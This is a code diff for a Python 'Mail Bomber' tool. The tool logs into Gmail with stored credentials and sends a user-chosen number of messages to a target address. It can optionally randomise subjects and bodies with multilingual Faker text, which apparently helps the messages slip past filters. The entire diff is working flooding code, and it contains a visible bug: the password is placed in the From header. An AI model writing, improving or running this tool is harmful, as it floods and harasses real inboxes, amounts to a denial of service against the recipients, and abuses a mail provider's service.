@@ -407,83 +407,120 @@ def fake_job():
 	print('\nQuery finished successfully in %s seconds ...' % (frmt_query))
 
 ## Mail Bomber
+def mail_maker(gmail_addr, gmail_pass, target_addr, subject, body):
+	sender_addr   = gmail_pass
+	receiver_addr = target_addr
+	message = MIMEMultipart()
+	message['From'] = sender_addr
+	message['To']   = receiver_addr
+	message['Subject'] = subject
+	mail_content = body
+	message.attach(MIMEText(mail_content, 'plain'))
+	text = message.as_string()
+	return text
 
 def mail_bomber_proc():
-	fake_subj = Faker(['it_IT', 'ja_JP', 'cs_CZ', 'de_DE', 'es_ES', 'hi_IN', 'hr_HR', 'ar_SA', 'el_GR', 'tr_TR'])
-	fin_input = False
-	mail_content = ''
+	try:
+		fake_text = Faker(['it_IT', 'ja_JP', 'cs_CZ', 'de_DE', 'es_ES', 'hi_IN', 'hr_HR', 'ar_SA', 'el_GR', 'tr_TR'])
+		fin_input = False
+		mail_content = ''
+		texts = ''
 
-	open_json = open("setting.json","r")
-	str_json  = open_json.read()
-	arr_json  = re.split('; |, |\\n', str_json)
-	get_gmailaddr = re.split('; |, |\"', str(arr_json[0]))
-	get_gmailpass = re.split('; |, |\"', str(arr_json[1]))
+		open_json = open("setting.json","r")
+		str_json  = open_json.read()
+		arr_json  = re.split('; |, |\\n', str_json)
+		get_gmailaddr = re.split('; |, |\"', str(arr_json[0]))
+		get_gmailpass = re.split('; |, |\"', str(arr_json[1]))
 
-	sender_address   = get_gmailaddr[1]
-	sender_pass      = get_gmailpass[1]
-	receiver_address = input('Target\t: ')
+		sender_address   = get_gmailaddr[1]
+		sender_pass      = get_gmailpass[1]
+		receiver_address = input('Target E-Mail\t: ')
 
-	message = MIMEMultipart()
-	message['From'] = sender_address
-	message['To']   = receiver_address
-	message['Subject'] = input('Subject\t: ')
-	mail_content += input('Body\t: ')
-	mail_content += '\n'
-
-	while fin_input == False:
-		mail_content += input('\t  ')
-		if re.search('///', mail_content):
-			fin_input = True
-			continue
+		mail_subject = input('Mail Subject\t: ')
+		mail_content += input('Mail Content\t: ')
 		mail_content += '\n'
 
-	message.attach(MIMEText(mail_content, 'plain'))
-	session = smtplib.SMTP('smtp.gmail.com', 587)
-	session.starttls()
-	session.login(sender_address, sender_pass)
-	text = message.as_string()
+		while fin_input == False:
+			mail_content += input('\t\t  ')
+			if re.search('///', mail_content):
+				fin_input = True
+				continue
+			mail_content += '\n'
 
-	total_mail   = int(input('\nSpecify the bomb amount : '))
-	sub_loop     = int(total_mail/55)
-	interval     = total_mail/55
-	counter      = 1
-	random_subj  = input('Do you want to radomize the subject (Y) ? ')
-	print(str(fake_subj.text())[:25])
-	print(random_subj)
+		session = smtplib.SMTP('smtp.gmail.com', 587)
+		session.starttls()
+		session.login(sender_address, sender_pass)
 
-	print('\n[+] Processing  | ', end="", flush=True)
-	for i in range(54):
-		if random_subj == 'y':
-			print(str(fake_subj.text())[:25])
-			message['Subject'] = str(fake_subj.text())[:25]
-			message.attach(MIMEText(mail_content, 'plain'))
-			text = message.as_string()
-		if sub_loop < 1:
-			for j in range(1):
-				if counter <= total_mail:
-					session.sendmail(sender_address, receiver_address, text)
-					#print('mail sent : %s' % (counter))
-					counter += 1
-					time.sleep(0.3)
-		else:
-			for j in range(sub_loop*2):
-				if counter <= total_mail:
-					session.sendmail(sender_address, receiver_address, text)
-					#print('mail sent : %s' % (counter))
-					counter += 1
-					time.sleep(0.3)
-		prog = ':'
-		print(prog, end="", flush=True)
-		time.sleep(0.1)
+		total_mail   = int(input('Bomb Amount\t: '))
+		sub_loop     = int(total_mail/55)
+		interval     = total_mail/55
+		counter      = 1
+		#random_subj  = input('Do you want to radomize the subject (Y) ? ')
+		#print(str(fake_subj.text())[:25])
+		#print(random_subj)
+		#frmt_query = '{:.3f}'.format(time.time() - go_time)
 
-	print('\n[+] Finalizing  | ', end="", flush=True)
-	for i in range(54):
-		prog = ':'
-		print(prog, end="", flush=True)
-		time.sleep(0.1)
-	print()
-	session.quit()
-	open_json.close()
+		est_time = '{:.4f}'.format(float(((total_mail * 2.3) + 5.5) / 3600))
+		texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
+		go_time = time.time()
+		mail_passer_subj = mail_subject
+		mail_passer_cont = mail_content
+		print('\nEstimated processing time is around %s hours' % est_time)
+		print('[+] Processing  | ', end="", flush=True)
+		for i in range(54):
+			if sub_loop < 1:
+				for j in range(1):
+					if mail_passer_subj == '//random':
+						mail_subject_2 = str(fake_text.text())[:25]
+						mail_subject = mail_subject_2
+						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
+					if re.search('//random', mail_passer_cont):
+						mail_content_2 = ''
+						for i in range(10):
+							mail_content_2 += fake_text.text()
+						mail_content = mail_content_2
+						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
+					if counter <= total_mail:
+						session.sendmail(sender_address, receiver_address, texts)
+						#print('mail sent : %s' % (counter))
+						counter += 1
+						time.sleep(0.3)
+			else:
+				for j in range(sub_loop*2):
+					if mail_passer_subj == '//random':
+						mail_subject_2 = str(fake_text.text())[:25]
+						mail_subject = mail_subject_2
+						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
+					if re.search('//random', mail_passer_cont):
+						mail_content_2 = ''
+						for i in range(10):
+							mail_content_2 += fake_text.text()
+						mail_content = mail_content_2
+						texts = mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
+					if counter <= total_mail:
+						session.sendmail(sender_address, receiver_address, texts)
+						#print('mail sent : %s' % (counter))
+						counter += 1
+						time.sleep(0.3)
+			prog = ':'
+			print(prog, end="", flush=True)
+			time.sleep(0.3)
+
+		print('\n[+] Finalizing  | ', end="", flush=True)
+		for i in range(54):
+			prog = ':'
+			print(prog, end="", flush=True)
+			time.sleep(0.06)
+		print()
+		session.quit()
+		open_json.close()
+
+		frmt_query = '{:.3f}'.format(time.time() - go_time)
+		print('\nQuery finished successfully in %s seconds ...' % (frmt_query))
+	except:
+		err_i = str(sys.exc_info()[1])[:55] + ' ...)'
+		print('\n\nIt seems the connection have been refused')
+		print('Error : %s' % err_i)
 
 ## Main Method
 def main_method():
